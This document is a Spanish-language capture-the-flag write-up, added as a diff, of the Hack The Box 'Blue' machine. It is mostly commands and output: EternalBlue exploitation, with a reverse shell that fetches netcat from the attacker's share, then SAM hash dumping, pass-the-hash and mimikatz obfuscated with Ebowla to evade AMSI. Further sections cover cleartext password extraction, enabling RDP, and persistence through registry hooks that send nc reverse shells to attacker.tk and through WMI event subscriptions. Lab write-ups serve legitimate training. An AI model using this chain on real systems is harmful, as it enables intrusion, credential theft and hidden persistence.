@@ -1,0 +1,617 @@
+---
+layout: post
+title: Blue
+date: 2023-04-08
+description:
+img:
+fig-caption:
+tags: [OSCP]
+---
+___
+
+<center><img src="/writeups/assets/img/Blue-htb/Blue.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+* Explotación de EternalBlue
+
+* Dumpeo de hashes NT [EXTRA]
+
+* Dumpeo de credenciales con mimikatz [EXTRA]
+
+* Habilitación de RDP [EXTRA]
+
+* Técnicas de Persistencia [EXTRA]
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.40 -oG openports
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-08 11:24 GMT
+Nmap scan report for 10.10.10.40
+Host is up (0.052s latency).
+Not shown: 60179 closed tcp ports (reset), 5346 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 18.96 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p135,139,445,3389,49152,49153,49154,49155,49156,49157 10.10.10.40 -oN portscan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-08 11:25 GMT
+Nmap scan report for 10.10.10.40
+Host is up (0.10s latency).
+
+PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server?
+| rdp-ntlm-info: 
+|   Target_Name: HARIS-PC
+|   NetBIOS_Domain_Name: HARIS-PC
+|   NetBIOS_Computer_Name: HARIS-PC
+|   DNS_Domain_Name: haris-PC
+|   DNS_Computer_Name: haris-PC
+|   Product_Version: 6.1.7601
+|_  System_Time: 2023-04-08T11:27:22+00:00
+|_ssl-date: 2023-04-08T11:27:32+00:00; +2s from scanner time.
+| ssl-cert: Subject: commonName=haris-PC
+| Not valid before: 2023-04-07T10:55:07
+|_Not valid after:  2023-10-07T10:55:07
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49156/tcp open  msrpc              Microsoft Windows RPC
+49157/tcp open  msrpc              Microsoft Windows RPC
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -11m57s, deviation: 26m47s, median: 1s
+| smb2-security-mode: 
+|   210: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2023-04-08T11:27:24
+|_  start_date: 2023-04-08T10:06:55
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2023-04-08T12:27:26+01:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 105.83 seconds
+```
+
+## Puerto 445 (SMB)
+
+Con ```crackmapexec``` aplico un escaeno para ver dominio, hostname y versiones
+
+```null
+crackmapexec smb 10.10.10.40
+SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
+```
+
+No está firmado y es de versión 1, por lo que lo más probable es que sea vulnerable al EternalBlue. Utilizo un exploit público disponible en [Github](https://github.com/worawit/MS17-010). Al ejecutar el ```checker.py``` de primeras pone que no es vulnerable con ningún Named Pipe
+
+```null
+python2 checker.py 10.10.10.40
+Target OS: Windows 7 Professional 7601 Service Pack 1
+The target is not patched
+
+=== Testing named pipes ===
+spoolss: STATUS_ACCESS_DENIED
+samr: STATUS_ACCESS_DENIED
+netlogon: STATUS_ACCESS_DENIED
+lsarpc: STATUS_ACCESS_DENIED
+browser: STATUS_ACCESS_DENIED
+```
+
+Le indico que el usuario es ```null```
+
+```null
+USERNAME = 'null'
+PASSWORD = ''
+```
+
+La respuesta cambia
+
+```null
+python2 checker.py 10.10.10.40
+Target OS: Windows 7 Professional 7601 Service Pack 1
+The target is not patched
+
+=== Testing named pipes ===
+spoolss: STATUS_OBJECT_NAME_NOT_FOUND
+samr: Ok (64 bit)
+netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
+lsarpc: Ok (64 bit)
+browser: Ok (64 bit)
+```
+
+Le añado al ```zzz_exploit.py``` también el usuario y además el comando que quiero ejecutar, en este caso una reverse shell ejecutando un ```netcat``` compartido desde mi equipo
+
+```null
+service_exec(conn, r'cmd /c \\10.10.16.3\shared\nc.exe -e cmd 10.10.16.3 443')
+```
+
+Utilizo ```impacket-smbserver``` para hostear el ```netcat```
+
+```null
+impacket-smbserver shared $(pwd) -smb2support
+```
+
+Ejecuto y obtengo la shell en una sesión interactiva
+
+```null
+python2 zzz_exploit.py 10.10.10.40 samr
+```
+
+```null
+nc -nvlp 443
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.40.
+Ncat: Connection from 10.10.10.40:49165.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+Puedo ver las dos flags
+
+```null
+C:\Windows\system32>type C:\Users\haris\Desktop\user.txt
+type C:\Users\haris\Desktop\user.txt
+bafa290471c6e56095265a17fcb42ff0
+
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+7cf5d9c002868b34a8d815eda9905bda
+```
+
+# Técnicas de Persistencia (EXTRA)
+
+### Dumpeo hashes NT
+
+```null
+C:\Windows\system32>reg save HKLM\system system.bak
+reg save HKLM\system system.bak
+The operation completed successfully.
+
+C:\Windows\system32>reg save HKLM\sam sam.bak
+reg save HKLM\sam sam.bak
+The operation completed successfully.
+```
+
+Ambos archivos los transfiero a mi equipo por SMB
+
+```null
+C:\Windows\system32>copy .\system.bak \\10.10.16.3\shared\system.bak
+copy .\system.bak \\10.10.16.3\shared\system.bak
+        1 file(s) copied.
+
+C:\Windows\system32>copy .\sam.bak \\10.10.16.3\shared\sam.bak
+copy .\sam.bak \\10.10.16.3\shared\sam.bak
+        1 file(s) copied.
+```
+
+Con ```impacket-secretsdump``` extraigo los hashes NT
+
+```null
+impacket-secretsdump -system system.bak -sam sam.bak LOCAL
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0xa749692f1dc76b46d7141ef778aa6bef
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::
+[*] Cleaning up... 
+```
+
+Lo valido con ```crackmapexec```
+
+```null
+crackmapexec smb 10.10.10.40 -u 'Administrator' -H 'cdf51b162460b7d5bc898f493751a0cc'
+SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
+SMB         10.10.10.40     445    HARIS-PC         [+] haris-PC\Administrator:cdf51b162460b7d5bc898f493751a0cc (Pwn3d!)
+```
+
+Puedo hacer PassTheHash con ```psexec```
+
+```null
+impacket-psexec WORKGROUP/Administrator@10.10.10.40 -hashes :cdf51b162460b7d5bc898f493751a0cc
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.40.....
+[*] Found writable share ADMIN$
+[*] Uploading file qsdtczUQ.exe
+[*] Opening SVCManager on 10.10.10.40.....
+[*] Creating service plIp on 10.10.10.40.....
+[*] Starting service plIp.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> 
+```
+
+## Dumpeo de credenciales de la memoria
+
+Para evitar problemas de detección de amenazas con el AMSI, utilizo una herramienta llamada ```Ebowla```, que mediante las propias variables de entorno del sistema es capaz de obfuscar un binario. Clono el repositorio desde el [Github](https://github.com/Genetic-Malware/Ebowla)
+
+Retoco el archivo ```genetic.config``` para indicar que el compilador sea GO
+
+```null
+output_type = go
+```
+
+El tipo de payload un EXE
+
+```null
+payload_type = exe 
+```
+
+Y añado las variables de entorno
+
+```null
+[[ENV_VAR]]
+
+    username = 'HARIS-PC$'
+    computername = 'HARIS-PC'
+    homepath = ''
+    homedrive = ''
+    Number_of_processors = '2'
+    processor_identifier = 'AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD'
+    processor_revision = ''
+    userdomain = ''
+    systemdrive = ''
+    userprofile = ''
+    path = 'C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;'
+    temp = ''
+```
+
+Se extraen así:
+
+```null
+C:\Windows\system32>echo %username%
+echo %username%
+HARIS-PC$
+```
+
+Ejecuto pasándole como argumentos el binario y archivo de configuración
+
+```null
+python2 ebowla.py /opt/mimikatz/x64/mimikatz.exe genetic.config
+[*] Using Symmetric encryption
+[*] Payload length 1250056
+[*] Payload_type exe
+[*] Using EXE payload template
+[*] Used environment variables:
+	[-] environment value used: Number_of_processors, value used: 2
+	[-] environment value used: computername, value used: haris-pc
+	[-] environment value used: path, value used: c:\windows\system32;c:\windows;c:\windows\system32\wbem;c:\windows\system32\windowspowershell\v1.0\;
+	[-] environment value used: processor_identifier, value used: amd64 family 23 model 49 stepping 0, authenticamd
+	[-] environment value used: username, value used: haris-pc$
+[!] Path string not used as pasrt of key
+[!] External IP mask NOT used as part of key
+[!] System time mask NOT used as part of key
+[*] String used to source the encryption key: 2haris-pcc:\windows\system32;c:\windows;c:\windows\system32\wbem;c:\windows\system32\windowspowershell\v1.0\;amd64 family 23 model 49 stepping 0, authenticamdharis-pc$
+[*] Applying 10000 sha512 hash iterations before encryption
+[*] Encryption key: 806087d541e153e8619a77e8a6d2bdc5254907dc915e502ed42319d07c81c51d
+[*] Writing GO payload to: go_symmetric_mimikatz.exe.go
+```
+
+Lo compilo para subirlo a la máquina víctima
+
+```null
+./build_x64_go.sh output/go_symmetric_mimikatz.exe.go obfmimikatz.exe
+[*] Copy Files to tmp for building
+[*] Building...
+[*] Building complete
+[*] Copy obfmimikatz.exe to output
+[*] Cleaning up
+[*] Done
+```
+
+Finalmente ejecuto
+
+```null
+C:\Windows\Temp\Privesc>.\obfmimikatz.exe
+.\obfmimikatz.exe
+[*] IV: 74839abdadef999b92691ebb88abce6d
+[*] Size of encrypted_payload:  1666816
+[*] Hash of encrypted_payload: b6efdeb8d861ddb01c8329903512d80cbc6a7867834a8af5c0d559717a51135c526de6af7e184d8ddb357cabf00139d2795dac23f4a1ee69f5bf9221cefeea2c
+[*] Number of keys: 1
+[*] Final key_list: [2haris-pcc:\windows\system32;c:\windows;c:\windows\system32\wbem;c:\windows\system32\windowspowershell\v1.0\;amd64 family 23 model 49 stepping 0, authenticamdharis-pc$]
+==================================================
+[*] Key: 2haris-pcc:\windows\system32;c:\windows;c:\windows\system32\wbem;c:\windows\system32\windowspowershell\v1.0\;amd64 family 23 model 49 stepping 0, authenticamdharis-pc$
+[*] Computed Full Key @ 2710 iterations: 806087d541e153e8619a77e8a6d2bdc5254907dc915e502ed42319d07c81c51dbf929954e5b4d8497ffab373f05b4046091da6393a9fbed20c2559f16d5af430
+[*] AES Password 806087d541e153e8619a77e8a6d2bdc5254907dc915e502ed42319d07c81c51d
+[*] Decoded Payload with Padding: a9631874abeaa84344704bf00643aad71f41eaa117ee5ea7bc9fdb529d44f255190a6338924a305cec6fdd7d5449598e6e122c9994d81ee247cfd614b039c14d
+[*] Message Length: 1250056
+[*] Message Length w/ Padding: 1250056
+[*] Test Hash : 3e80bad1df8be59c265c2ff42b3aae96e166ad9ba7d3e0f4b8a88851f101bec481672b05daaaebcb7b01f3eae85e8adc0b9bbe7d1d31feacff613c200b1e1a96
+Search Hash: 3e80bad1df8be59c265c2ff42b3aae96e166ad9ba7d3e0f4b8a88851f101bec481672b05daaaebcb7b01f3eae85e8adc0b9bbe7d1d31feacff613c200b1e1a96
+[*] Hashes Match
+Len full_payload: 1250056
+[*] Key Combinations:  [[2haris-pcc:\windows\system32;c:\windows;c:\windows\system32\wbem;c:\windows\system32\windowspowershell\v1.0\;amd64 family 23 model 49 stepping 0, authenticamdharis-pc$]]
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+mimikatz # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 1724283 (00000000:001a4f7b)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : haris-PC
+Logon Server      : HARIS-PC
+Logon Time        : 08/04/2023 11:56:06
+SID               : S-1-5-21-319597671-3711062392-2889596693-500
+	msv :	
+	[00010000] CredentialKeys
+	* NTLM     : cdf51b162460b7d5bc898f493751a0cc
+	* SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+	[00000003] Primary
+	* Username : Administrator
+	* Domain   : haris-PC
+	* NTLM     : cdf51b162460b7d5bc898f493751a0cc
+	* SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+	tspkg :	
+	wdigest :	
+	* Username : Administrator
+	* Domain   : haris-PC
+	* Password : ejfnIWWDojfWEKM
+	kerberos :	
+	* Username : Administrator
+	* Domain   : haris-PC
+	* Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 256151 (00000000:0003e897)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : haris-PC
+Logon Server      : HARIS-PC
+Logon Time        : 08/04/2023 11:07:15
+SID               : S-1-5-21-319597671-3711062392-2889596693-500
+	msv :	
+	[00010000] CredentialKeys
+	* NTLM     : cdf51b162460b7d5bc898f493751a0cc
+	* SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+	[00000003] Primary
+	* Username : Administrator
+	* Domain   : haris-PC
+	* NTLM     : cdf51b162460b7d5bc898f493751a0cc
+	* SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+	tspkg :	
+	wdigest :	
+	* Username : Administrator
+	* Domain   : haris-PC
+	* Password : ejfnIWWDojfWEKM
+	kerberos :	
+	* Username : Administrator
+	* Domain   : haris-PC
+	* Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 245586 (00000000:0003bf52)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : haris-PC
+Logon Server      : HARIS-PC
+Logon Time        : 08/04/2023 11:07:07
+SID               : S-1-5-21-319597671-3711062392-2889596693-500
+	msv :	
+	[00010000] CredentialKeys
+	* NTLM     : cdf51b162460b7d5bc898f493751a0cc
+	* SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+	[00000003] Primary
+	* Username : Administrator
+	* Domain   : haris-PC
+	* NTLM     : cdf51b162460b7d5bc898f493751a0cc
+	* SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+	tspkg :	
+	wdigest :	
+	* Username : Administrator
+	* Domain   : haris-PC
+	* Password : ejfnIWWDojfWEKM
+	kerberos :	
+	* Username : Administrator
+	* Domain   : haris-PC
+	* Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 08/04/2023 11:06:54
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	* Username : (null)
+	* Domain   : (null)
+	* Password : (null)
+	kerberos :	
+	* Username : (null)
+	* Domain   : (null)
+	* Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : HARIS-PC$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 08/04/2023 11:06:54
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	* Username : HARIS-PC$
+	* Domain   : WORKGROUP
+	* Password : (null)
+	kerberos :	
+	* Username : haris-pc$
+	* Domain   : WORKGROUP
+	* Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 42019 (00000000:0000a423)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 08/04/2023 11:06:54
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : HARIS-PC$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 08/04/2023 11:06:54
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	* Username : HARIS-PC$
+	* Domain   : WORKGROUP
+	* Password : (null)
+	kerberos :	
+	* Username : haris-pc$
+	* Domain   : WORKGROUP
+	* Password : (null)
+	ssp :	
+	credman :	
+```
+
+### Abrir puertos con el Firewall
+
+En este caso, el RDP
+
+```null
+C:\Windows\Temp\Privesc>netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
+```
+
+```Crackmapexec``` tiene un módulo que lo automatiza
+
+```null
+crackmapexec smb 10.10.10.40 -u 'Administrator' -H 'cdf51b162460b7d5bc898f493751a0cc' -M rdp -o action=enable
+SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
+SMB         10.10.10.40     445    HARIS-PC         [+] haris-PC\Administrator:cdf51b162460b7d5bc898f493751a0cc (Pwn3d!)
+RDP         10.10.10.40     445    HARIS-PC         [+] RDP enabled successfully
+```
+
+Me conecto con ```rdesktop```
+
+```null
+rdesktop 10.10.10.40 -u 'Administrator' -p 'ejfnIWWDojfWEKM'
+Autoselecting keyboard map 'en-us' from locale
+
+ATTENTION! The server uses and invalid security certificate which can not be trusted for
+the following identified reasons(s);
+
+ 1. Certificate issuer is not trusted by this system.
+
+     Issuer: CN=haris-PC
+
+
+Review the following certificate info before you trust it to be added as an exception.
+If you do not trust the certificate the connection atempt will be aborted:
+
+    Subject: CN=haris-PC
+     Issuer: CN=haris-PC
+ Valid From: Fri Apr  7 10:55:07 2023
+         To: Sat Oct  7 10:55:07 2023
+
+  Certificate fingerprints:
+
+       sha1: 916e98bc56e226b3393f246f10ebe7dcbc4a1c71
+     sha256: 09ce5efc2ff9fffd720b0e96cf8d3560917146af58e62893f1d9b96c25eed4ac
+
+
+Do you trust this certificate (yes/no)? yes
+```
+
+### Persistencia
+
+La primera forma consiste en enviar una reverse shell cada vez que se ejecuta un programa
+
+```null
+copy calc.exe _calc.exe
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C _calc.exe & c:\windows\nc.exe -e c:\windows\system32\cmd.exe attacker.tk 8888" /f`
+```
+
+La segunda hará lo mismo pero al cerrar un proceso
+
+```null
+[+] Second Way
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "nc -e \windows\system32\cmd.exe attacker.tk 8888"
+```
+
+Pero para que no se abra una terminal cada vez que se ejecute, se puede crear una tarea que se ejecute en interavalos regulares de tiempo con los eventos WMI
+
+```null
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="persistence", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="persistence", ExecutablePath="C:\users\admin\meter.exe",CommandLineTemplate="C:\users\admin\meter.exe"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="persistence"", Consumer="CommandLineEventConsumer.Name="persistence""
+```
